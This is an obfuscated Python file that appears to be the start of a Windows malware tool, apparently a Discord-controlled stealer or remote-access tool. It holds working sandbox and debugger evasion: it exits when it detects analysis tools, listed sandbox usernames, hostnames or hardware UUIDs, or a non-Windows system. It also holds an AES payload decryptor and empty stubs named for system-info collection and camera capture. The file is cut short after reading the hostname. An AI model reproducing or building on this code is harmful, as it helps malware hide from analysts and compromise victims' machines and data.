
def AHPVGRZAXKTTOEJNIZVQOACOREFCSERLZGBXIEUCZJTLJKDAODWSNHKFKFUEPLIRNPXEBZNCRWT():
    import os
    import socket
    import subprocess
    import ctypes
    import sys
    import psutil

    MVWLVQGEYRJAEDVNTHBPQUXPEGIOMQQWTQWUQEAOJMQHTXZEICVBJX = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'Bruno' 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg', 'stephpie']
    PFOMIKIKIZCHKDUMHSMQBGXKMOIGKEMHPUGUZFAQKMWGZIPYXSIKNLJVFFSGMJDCUINZOVMMTNWRNRXRUQLDEUO = ['0CC47AC83802', 'BEE7370C-8C0C-4', 'DESKTOP-ET51AJO', '965543', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42', 'test']
    LAQJOUADKVRRCBNONLLLCQSPDLHMUMEDEFWFLSDHKPJYTSDGFUIXZKSWAIMFIPFHCJMSERCBOGJTCYIZA     = ['671BC5F7-4B0F-FF43-B923-8B1645581DC8', '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
    UQUBXEBAEDCICJOIFOFAIRPSNRNMIXLGTHGBBSJRNSBHVOVTRMEEXJBKXFCQGMHXBBPRWQZKL   = ['cheatengine', 'cheat engine', 'x32dbg', 'x64dbg', 'ollydbg', 'windbg', 'ida', 'ida64', 'ghidra', 'radare2', 'radare', 'dbg', 'immunitydbg', 'dnspy', 'softice', 'edb', 'debugger', 'visual studio debugger', 'lldb', 'gdb', 'valgrind', 'hex-rays', 'disassembler', 'tracer', 'debugview', 'procdump', 'strace', 'ltrace', 'drmemory', 'decompiler', 'hopper', 'binary ninja', 'bochs', 'vdb', 'frida', 'api monitor', 'process hacker', 'sysinternals', 'procexp', 'process explorer', 'monitor tool', 'vmmap', 'xperf', 'perfview', 'py-spy', 'strace-log']

    try:
        if sys.gettrace() is not None:
            return True
    except: pass

    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except: pass

    try:
        for v4r_proc in psutil.process_iter(['name']):
            try:
                LFFLSWRMSPVHXTFJSSLSBPSRPPGGKXLBOBLUEYYADYXCWFUPPGQCCZD = str(v4r_proc.info['name']).lower()
                if any(debugger in LFFLSWRMSPVHXTFJSSLSBPSRPPGGKXLBOBLUEYYADYXCWFUPPGQCCZD for debugger in UQUBXEBAEDCICJOIFOFAIRPSNRNMIXLGTHGBBSJRNSBHVOVTRMEEXJBKXFCQGMHXBBPRWQZKL):
                    return True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
            continue
    except: pass

    try:
        if os.getlogin() in MVWLVQGEYRJAEDVNTHBPQUXPEGIOMQQWTQWUQEAOJMQHTXZEICVBJX:
            return True
        elif os.getlogin().lower() in [v4r_u53rn4m3.lower() for v4r_u53rn4m3 in MVWLVQGEYRJAEDVNTHBPQUXPEGIOMQQWTQWUQEAOJMQHTXZEICVBJX]:
            return True
    except: pass

    try:
        if socket.gethostname() in PFOMIKIKIZCHKDUMHSMQBGXKMOIGKEMHPUGUZFAQKMWGZIPYXSIKNLJVFFSGMJDCUINZOVMMTNWRNRXRUQLDEUO:
            return True
        elif socket.gethostname().lower() in [v4r_h05tn4m3.lower() for v4r_h05tn4m3 in PFOMIKIKIZCHKDUMHSMQBGXKMOIGKEMHPUGUZFAQKMWGZIPYXSIKNLJVFFSGMJDCUINZOVMMTNWRNRXRUQLDEUO]:
            return True
    except: pass

    try: 
        if subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip() in LAQJOUADKVRRCBNONLLLCQSPDLHMUMEDEFWFLSDHKPJYTSDGFUIXZKSWAIMFIPFHCJMSERCBOGJTCYIZA:
            return True
    except: pass

    return False

try: FBOTIMBYJWIAGXDILEJXAHSRWBXABPGWCHEZBBWQQOGTYPZDBOKHQPUFOXHBKINENGXRQNRSHVXOPMYSSGTNSVCQILYLVZHET = AHPVGRZAXKTTOEJNIZVQOACOREFCSERLZGBXIEUCZJTLJKDAODWSNHKFKFUEPLIRNPXEBZNCRWT()
except: FBOTIMBYJWIAGXDILEJXAHSRWBXABPGWCHEZBBWQQOGTYPZDBOKHQPUFOXHBKINENGXRQNRSHVXOPMYSSGTNSVCQILYLVZHET = False

if FBOTIMBYJWIAGXDILEJXAHSRWBXABPGWCHEZBBWQQOGTYPZDBOKHQPUFOXHBKINENGXRQNRSHVXOPMYSSGTNSVCQILYLVZHET == True:
    import sys
    sys.exit()

import sys

def ORWMUPCPOVLEGJBRGWWBUZCYVEUDNCGIOYHGQJOWMCGUUZYOTYDLLSKWUDXAYWNDTWLADATRP():
    def AYYMGXSFHPMBQSRIYQDQFWOBGPERLZANKOUJQOJQRQDMOMXJSUSDMFDZ():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ = AYYMGXSFHPMBQSRIYQDQFWOBGPERLZANKOUJQOJQRQDMOMXJSUSDMFDZ()
        if FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ == True:
            return FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ
    except:
        return True
    
if ORWMUPCPOVLEGJBRGWWBUZCYVEUDNCGIOYHGQJOWMCGUUZYOTYDLLSKWUDXAYWNDTWLADATRP() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
import zipfile
import io
from json import loads
from urllib.request import urlopen
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def EJHGTQEIMBHTHAHNWHITNBKLVLRQMDZHUWXHPMFJZVXOYSJCZORZQGPDYPLUKKJHOFXVNMRXIBLDRMV(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI): 
    FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_system_info = None
    return FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_system_info

def AEAZTDKSDUKQBDRCPVURNGHDKQXNITPRMONFUFZCQEEBFNMWLWSXWUZQTLCTAMBWDYIRRCMCWQ(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI):
    DLFKMHFEMHCOOSUIFACPADFHHDLIRCDPPPLWPNBGZSKNCFKYNBSSE = None
    return DLFKMHFEMHCOOSUIFACPADFHHDLIRCDPPPLWPNBGZSKNCFKYNBSSE

def EQUQRNFLAFTUTUUVIGGOHPQWEUGCADGLFJRKYKOYWUUUYYJHRAORKNOHVFDOXQBHURMAEJPXNQAQUZTYSASLQOGVL(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI):
    MVORSKFSYNELBCHBUUYXVSDOHYZQWXZSJPJGKWJDALFVXLLSIQLUDGLOPLLYJVIUWBDFZLJTOJKLLQZSTAJZTRZQHIQV = None
    return MVORSKFSYNELBCHBUUYXVSDOHYZQWXZSJPJGKWJDALFVXLLSIQLUDGLOPLLYJVIUWBDFZLJTOJKLLQZSTAJZTRZQHIQV

def GGZQVAYTKSYOXHKTXWLAYCYTUJQVVDZTNTCGUPNQYBXAFGQAWAFOFYJZQZVFATNJESJWOGACFHHDWWERIQGKCAGGCSPLH(): 
    ILSUGHEIZWMHZCFVRCKYVZXXXECUMDHEKOPQKVJRVKAKYODIRSCPXHLUDECYPKGXFHUXDQCWVWBPIOOHNTZEKMVTSFMFZD = None
    return ILSUGHEIZWMHZCFVRCKYVZXXXECUMDHEKOPQKVJRVKAKYODIRSCPXHLUDECYPKGXFHUXDQCWVWBPIOOHNTZEKMVTSFMFZD

def NDTBJPMJUIMTBSPSKEYLCNBGAFYRPPUHNYAXWPXHKOCCZHIWOZHSSWFGEIGVIWPEGZMAQYZDGRMKGXTGDIGJWXLSK(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI): 
    KXWMDENTRODMBBONQIACTTHKXYQXBWBKVTBZFOKHSDMWJMDCLRVMYUPMFIS = None
    FVMPTXUPBJAZIZSCOKDEGXDTDRYKJAUSWMTSPGWAKEZUJDZRSQCHZFHLETSSOEKOWPHQMRSRVUJHGPMEYQ = None
    WQZLIJYQXTGWJWSDKFNFRKZDBOWYXZHYOFOYKXLWEGPQIJWLQTKYKBGXYOXOMLVQAIHGBTMUGWVSNACSYEYBSQI = None
    FGAWRSBTJJOCBDBEQKKRXNTRINKASWQCARWLJHURTCUIRESYUPNEUHFQBVUWPHKRXDUELSLERYTTMXFSKSIK = None
    KSGGLTPYPNERECKZBJCCCNRECEYUQSYPBAEEYCJBQDDJJVBFPXOMYQITONAFOZNHYQKSGOFTYHKGQGZWFLTRF = None
    PTDCJYGBMXGRBVIUTDWJJUZVMPVDKLLCRBGGQSNUDQKDADDQWTLXUFKNRGYZRGVFE = None
    return KXWMDENTRODMBBONQIACTTHKXYQXBWBKVTBZFOKHSDMWJMDCLRVMYUPMFIS, FVMPTXUPBJAZIZSCOKDEGXDTDRYKJAUSWMTSPGWAKEZUJDZRSQCHZFHLETSSOEKOWPHQMRSRVUJHGPMEYQ, WQZLIJYQXTGWJWSDKFNFRKZDBOWYXZHYOFOYKXLWEGPQIJWLQTKYKBGXYOXOMLVQAIHGBTMUGWVSNACSYEYBSQI, FGAWRSBTJJOCBDBEQKKRXNTRINKASWQCARWLJHURTCUIRESYUPNEUHFQBVUWPHKRXDUELSLERYTTMXFSKSIK, KSGGLTPYPNERECKZBJCCCNRECEYUQSYPBAEEYCJBQDDJJVBFPXOMYQITONAFOZNHYQKSGOFTYHKGQGZWFLTRF, PTDCJYGBMXGRBVIUTDWJJUZVMPVDKLLCRBGGQSNUDQKDADDQWTLXUFKNRGYZRGVFE

def TQUJVOZDRADKLDSOLXKDXOEDCGDWHFQKVDRGBUMKPIHMTHUFKHUMRPLGPEWGZJDGBBALZ(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI):
    CLRSIVUAITTGJWOEOTDGLJEOYRNLDZQOTAHHHOTZZLJUFLVLYTLUVMUIPLAULSNOXHODZMGQFXI = None
    IMGQSSVGAFTXEWGBSICZAGCFVSLJYPWIKVYPAWZQAHXIWUYKFFOPQVKZAS = None
    TXGJFROSUQYVJLTATLIKADIZZGDBDYRRXDVECLZVSWWIXYEFIZUMIEIFSVZYQREEZTFYETBYLLUJOWGGGRCMQNQODVVRMIBAIG = None
    return CLRSIVUAITTGJWOEOTDGLJEOYRNLDZQOTAHHHOTZZLJUFLVLYTLUVMUIPLAULSNOXHODZMGQFXI, IMGQSSVGAFTXEWGBSICZAGCFVSLJYPWIKVYPAWZQAHXIWUYKFFOPQVKZAS, TXGJFROSUQYVJLTATLIKADIZZGDBDYRRXDVECLZVSWWIXYEFIZUMIEIFSVZYQREEZTFYETBYLLUJOWGGGRCMQNQODVVRMIBAIG

def YHKOOPOQFRQRLVTLJALHCWVWBGUUCBPPWOLLNOFMWNYHSYFCRIQKEZYAUZUQMWUWLHBIUS(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI):
    NZVSXRFZAKAETTRSWINNBYKWUNQBWEAEUHINGYYRVUEUGMOLZRQACWOVZQTCFSZYMLFVYMTPJFCIHVIPQWWKKXN = None
    return NZVSXRFZAKAETTRSWINNBYKWUNQBWEAEUHINGYYRVUEUGMOLZRQACWOVZQTCFSZYMLFVYMTPJFCIHVIPQWWKKXN

def UKMKUDULDRAXHHLBISLSLEJDPZWZMQARELWJVAIBCFNMCLPGYZDYYOGVMKLOTQYOWEAGDUDJHQ(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI):
    FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_camera_capture = None
    return FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_camera_capture

def BLIPVMSPQFDRAWCQWOJHKOJHVGJBXOLMDTXAHDMEWHGXLQLFHP(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI): 
    FUFEYVMASHIXZDVGDQTBAXTXRAIUEZKTYYVXAPUKZSLFMPOFGIZCQSQJVGDGDIMALZGQOTYFKVADNRAEGKVKK = None
    return FUFEYVMASHIXZDVGDQTBAXTXRAIUEZKTYYVXAPUKZSLFMPOFGIZCQSQJVGDGDIMALZGQOTYFKVADNRAEGKVKK

def BLEBWCMOSWIERTUJEOJKFSKELTYDDNXVMLYSEGGWUJXWDBBPVIXZCEDYFXHXTDRIKNLRYSFGCWUKZXVGWLMXPXTYVTXXT(): pass
def FDOWJZEGBDLFZATKCETLOBGAMLGSGLDRSSMBIUSALTPMUAMNYZZJWSBULJLN(): pass
def VETCRYBDDLVSPEPPDGYQZVJDCUWOABZVZNRTGUCPKDMPQDPHIJRTGFG(): pass
def VDXWCTNUDNSKVIXWCHOEWVFYCGRCNIYSSQXFUMLWISQHYWGCXRCVFJPLIEQUGGVTYUEIJPBSWCOEVGKTGM(): pass
def KEBCQQOIMLADPUYYYYFTQHOGWRPBLJZYEIJMWTCQKXLLRHWEYQRPZVDJJAHGGWLIRBSYYLBWSFHICFAKER(): pass
def XRSEGBYACHRRGOSTCTRXDIIGQCZDADQHQUBQYJMIEJTLOKJPKUSVCYTLKSPSMN(): pass
def LVRTAFOUKOBMYLCDGJVHCUECHXGZBSZRTDHZPKZSUJPBEOFWMFWYOFXEOHOWBHTPLOWWWVMHJCXDPWYXDAXOUKINO(): pass
def OHPPFAGACNDCVLDCMSOKWNPXQJRREFTZAXMRRDKQQDMYQHVBWH(): pass
def JQASVREWOTHAJVLKXUOZXXBKUQEMOVFPLVHFXYJHRJGWWUHKBSZNQGAHNNJDHMGLLREPLI(): pass
def TSKXYSNRFQKFHXIWYWQKXZWILFIAVFLDNGXTFNIBNGXCYFWBCOX(): pass
def TOHJGLIZSBWXYSTRGSODMFNINPIPUITBHPUPHMDVIOHDQUUUHUKASIFBHUWESGAYFKODIFR(): pass
def SAZXTQMJCOEPCNHXSPAJFYCYDISYCKVJPRBKRSCMTHMLODEIHAC(): pass

def NREBBFCIKSYOGHTLVNFFXCDOSXPFGQSLQGIJPKTJPNWLJXEAQUEIASZJYKQLOJM(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def EPNFSQMWCGFFILNGXBSUHKDNQILQIJLAMLLUABDZPIIOVQPLBLRCMSZMKLZLRWGUGGGUOFOFUGRASLXG():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def OGPEXAMMLQCTCCGKKRBMDMPUBJWXMJBVVZVRUWRAWRGQGJDKPSCORUDUAPTQHASCPOMCLZXCPCSH(ODEJAYLGGWUBLLQWMPQVFQGXCNBURIFELEYDGWZVPHEJNTAEGJJROSCELBECCZBCDLH, SBARHFCWEJUQUQIEWBHFYSNCZLXEEZUQUMZGFQNVSYPLPVIIWRDPRLZWDZHQS):
    def WNFRVJBVZEFWYDRKEFOQZPYCNDXHWORCVXFQDWLNXSASAKJGEFQMJELKVWBLIJSQEUTJOMTMMIVUEGUA(BKOYSQIXIMJCZMTTTRKZNINXGIXUPUTZBBXYKCIWFEHZNRSIYRGFJCTEGYCLGBPZRVED, EVWUWAHUSKAQCUOZGKDOKHABLOANLDIXERXPVOIEHMOOFGTOHWSWFDUJKYPDA):
        ZOHTGQQZQUJGXREOEOFNMIRTUGOKYOWKIZHIYSYXZOTGQUZTJADSPFTWAUVQZQDVNUQYZTPYNOSMTXRMDWAMRFPI = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=EVWUWAHUSKAQCUOZGKDOKHABLOANLDIXERXPVOIEHMOOFGTOHWSWFDUJKYPDA, iterations=100000, backend=default_backend())
        if isinstance(BKOYSQIXIMJCZMTTTRKZNINXGIXUPUTZBBXYKCIWFEHZNRSIYRGFJCTEGYCLGBPZRVED, str):  
            BKOYSQIXIMJCZMTTTRKZNINXGIXUPUTZBBXYKCIWFEHZNRSIYRGFJCTEGYCLGBPZRVED = BKOYSQIXIMJCZMTTTRKZNINXGIXUPUTZBBXYKCIWFEHZNRSIYRGFJCTEGYCLGBPZRVED.encode()  
        return ZOHTGQQZQUJGXREOEOFNMIRTUGOKYOWKIZHIYSYXZOTGQUZTJADSPFTWAUVQZQDVNUQYZTPYNOSMTXRMDWAMRFPI.derive(BKOYSQIXIMJCZMTTTRKZNINXGIXUPUTZBBXYKCIWFEHZNRSIYRGFJCTEGYCLGBPZRVED)

    ODEJAYLGGWUBLLQWMPQVFQGXCNBURIFELEYDGWZVPHEJNTAEGJJROSCELBECCZBCDLH_data = base64.b64decode(ODEJAYLGGWUBLLQWMPQVFQGXCNBURIFELEYDGWZVPHEJNTAEGJJROSCELBECCZBCDLH)
    EVWUWAHUSKAQCUOZGKDOKHABLOANLDIXERXPVOIEHMOOFGTOHWSWFDUJKYPDA = ODEJAYLGGWUBLLQWMPQVFQGXCNBURIFELEYDGWZVPHEJNTAEGJJROSCELBECCZBCDLH_data[:16]
    QLKTXILHSLSJTCQDFBWTAKRRYNBASLIJLMPOKDDAGGMVNTNLDOVTGGOCZIAJAQRPJIQDDYUALHEUT = ODEJAYLGGWUBLLQWMPQVFQGXCNBURIFELEYDGWZVPHEJNTAEGJJROSCELBECCZBCDLH_data[16:32]
    ODEJAYLGGWUBLLQWMPQVFQGXCNBURIFELEYDGWZVPHEJNTAEGJJROSCELBECCZBCDLH_data = ODEJAYLGGWUBLLQWMPQVFQGXCNBURIFELEYDGWZVPHEJNTAEGJJROSCELBECCZBCDLH_data[32:]
    SKSRMKHUUXOAZBEORXSGNDCPPQVMSVRVVPHRWDTKBPCYKKWYARUBUJTYLHXCUHGMSOTMXWGXZGVPAIAVGTSEUHSRMEKALI = WNFRVJBVZEFWYDRKEFOQZPYCNDXHWORCVXFQDWLNXSASAKJGEFQMJELKVWBLIJSQEUTJOMTMMIVUEGUA(SBARHFCWEJUQUQIEWBHFYSNCZLXEEZUQUMZGFQNVSYPLPVIIWRDPRLZWDZHQS, EVWUWAHUSKAQCUOZGKDOKHABLOANLDIXERXPVOIEHMOOFGTOHWSWFDUJKYPDA)
    GHSCSCPVNYFSGOANGCAOVLQMMTNJQCGLHLJVDNRRBOPNNIOYTVSXNFOHOVVUYLVUQMOFVMKH = Cipher(algorithms.AES(SKSRMKHUUXOAZBEORXSGNDCPPQVMSVRVVPHRWDTKBPCYKKWYARUBUJTYLHXCUHGMSOTMXWGXZGVPAIAVGTSEUHSRMEKALI), modes.CBC(QLKTXILHSLSJTCQDFBWTAKRRYNBASLIJLMPOKDDAGGMVNTNLDOVTGGOCZIAJAQRPJIQDDYUALHEUT), backend=default_backend())
    LPFPLMJWMZGSVEOBQFYVMCJRMURKZCUBQXXBBWMBZHDNJOUQLTISVBPRABDRQMQTKYZCKROMWDGDVZNAHO = GHSCSCPVNYFSGOANGCAOVLQMMTNJQCGLHLJVDNRRBOPNNIOYTVSXNFOHOVVUYLVUQMOFVMKH.decryptor()
    MPPKZWCSPONYSXIBVPFLEWQUDOKTNZTCEJSSQKRWDPLVUGXYZPANMJTWTNGUYGKQKMWRFMBJKWVRJHEHEHS = LPFPLMJWMZGSVEOBQFYVMCJRMURKZCUBQXXBBWMBZHDNJOUQLTISVBPRABDRQMQTKYZCKROMWDGDVZNAHO.update(ODEJAYLGGWUBLLQWMPQVFQGXCNBURIFELEYDGWZVPHEJNTAEGJJROSCELBECCZBCDLH_data) + LPFPLMJWMZGSVEOBQFYVMCJRMURKZCUBQXXBBWMBZHDNJOUQLTISVBPRABDRQMQTKYZCKROMWDGDVZNAHO.finalize()
    TZQPYRJAQSWBJYDDRDRNIXORVFWXYVNOZALLOOYFDQVXHQIHCXEJBOHEPOJMVOMLHGUABQFMSZMYITLMHIOCHP = padding.PKCS7(128).unpadder()
    ATXSVUQZUKMOFBSEXCXCXNNIXSKJWWGIOUMXPMEKTBWRFCHECNRWAQJXQYEHLXCGNAZPAY = TZQPYRJAQSWBJYDDRDRNIXORVFWXYVNOZALLOOYFDQVXHQIHCXEJBOHEPOJMVOMLHGUABQFMSZMYITLMHIOCHP.update(MPPKZWCSPONYSXIBVPFLEWQUDOKTNZTCEJSSQKRWDPLVUGXYZPANMJTWTNGUYGKQKMWRFMBJKWVRJHEHEHS) + TZQPYRJAQSWBJYDDRDRNIXORVFWXYVNOZALLOOYFDQVXHQIHCXEJBOHEPOJMVOMLHGUABQFMSZMYITLMHIOCHP.finalize()
    return ATXSVUQZUKMOFBSEXCXCXNNIXSKJWWGIOUMXPMEKTBWRFCHECNRWAQJXQYEHLXCGNAZPAY.decode()

NREBBFCIKSYOGHTLVNFFXCDOSXPFGQSLQGIJPKTJPNWLJXEAQUEIASZJYKQLOJM("")

try: OBFZEWJWHIXJSRVUIVVHWOOBFRNETBPXHWOVKCAGLOHMPXNSQJNRYWQZZWXRXTDXTWIOGMQIMWAKOQIHUCPGWMNROXX    = socket.gethostname()
except: OBFZEWJWHIXJSRVUIVVHWOOBFRNETBPXHWOVKCAGLOHMPXNSQJNRYWQZZWXRXTDXTWIOGMQIMWAKOQIHUCPGWMNROXX = "None"

